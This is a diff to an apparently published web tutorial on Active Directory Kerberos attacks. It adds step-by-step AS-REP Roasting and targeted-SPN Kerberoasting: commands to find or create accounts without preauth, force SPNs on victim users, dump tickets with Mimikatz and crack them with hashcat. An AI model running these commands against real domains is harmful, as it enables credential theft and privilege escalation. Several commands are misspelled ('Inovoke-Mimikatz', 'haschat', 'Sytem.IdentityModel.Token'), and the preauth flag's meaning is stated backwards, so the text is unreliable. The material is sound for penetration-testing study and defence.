@@ -325,7 +325,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Inovoke-Mimikatz -Command <span class="s1">'"kerberos::list /export"'</span>
 </code></pre></div></div>
 
-<h2 id="cracking-the-tgs">Cracking the TGS</h2>
+<h2 id="cracking-the-tickets">Cracking the tickets</h2>
 
 <p>Once the tickets are exported it can be cracked with <code class="highlighter-rouge">john</code>, <code class="highlighter-rouge">hashcat</code> or <code class="highlighter-rouge">tgsrepcrack.py</code> tool:</p>
 
@@ -340,8 +340,93 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>haschat -a 0 -m 13100 wordlist.txt ticket.txt
 </code></pre></div></div>
 
-<h1 id="as-reproasting">AS-REPRoasting</h1>
+<h1 id="as-rep-roasting">AS-REP Roasting</h1>
 
+<p>If a users account does not have the flag <em>“Do not require Kerberos pre-authentication”</em> in <em>UserAccountControl</em> settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.</p>
+
+<h2 id="users-with-no-preauth-set">Users with No-Preauth set</h2>
+
+<p>We need to enumerate accounts with Kerberos Preauth disabled:</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -PreauthNotRequired -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>DoesNotRequiredPreAuth -eq <span class="nv">$True</span><span class="o">}</span> -Properties DoesNotRequiredPreAuth
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p><strong>Note</strong>: With <code class="highlighter-rouge">GenericAll</code> or <code class="highlighter-rouge">GenericWrite</code>, kerberos preauth can be disabled.</p>
+
+  <p><code class="highlighter-rouge">Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose</code></p>
+</blockquote>
+
+<h2 id="cracking-the-tickets-1">Cracking the tickets</h2>
+
+<p>We can request an encrypted AS-REP for offline brute-force. To do that task we can use <code class="highlighter-rouge">ASREPRoast</code> module:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ASREPRoast.ps1
+Get-ASREPHash -UserName user01 -Verbose
+</code></pre></div></div>
+<p>After getting the ticket we can crack it with <code class="highlighter-rouge">john</code> or <code class="highlighter-rouge">hashcat</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john user01.ticket --wordlist=wordlist.txt
+hashcat -a 0 -m 18200 user01.ticket wordlist.txt
+</code></pre></div></div>
+
+<h1 id="set-spn">Set SPN</h1>
+
+<p>With enough privileges such as <code class="highlighter-rouge">GenericAll</code> or <code class="highlighter-rouge">GenericWrite</code>, a target user’s SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.</p>
+
+<p>We can enumerate the permissions for a group on ACLs:</p>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-ACLScanner -ResolveGUIDs | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReferenceName -match <span class="s2">"RDPUsers"</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>We can also see if a user already has a SPN:</p>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -Identity user01 | <span class="nb">select </span>serviceprincipalname
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Identity user01 -Properties ServicePrincipalName | <span class="nb">select </span>ServicePrincipalName
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>And we can force the SPN to a user:</p>
+
+<ul>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainObject -Identity user01 -Set @<span class="o">{</span><span class="nv">serviceprincipalname</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADUser</span> -Identity user01 -ServicePrincipalNames @<span class="o">{</span><span class="nv">Add</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Once we have a SPN set, we can request a TGS:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-Type</span> -AssemblyName System.IdentityModel
+<span class="nb">New-Object </span>Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList <span class="s2">"ops/whatever01"</span>
+</code></pre></div></div>
+<p>And we can export the tickets to the disk:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Inovoke-Mimikatz -Command <span class="s1">'"kerberos::list /export"'</span>
+</code></pre></div></div>
+<p>And finally same as <em>Kerberoasting</em>, you can crack the ticket with <code class="highlighter-rouge">tgsrepcrack.py</code>.</p>
 
 			</article>
 		</section>
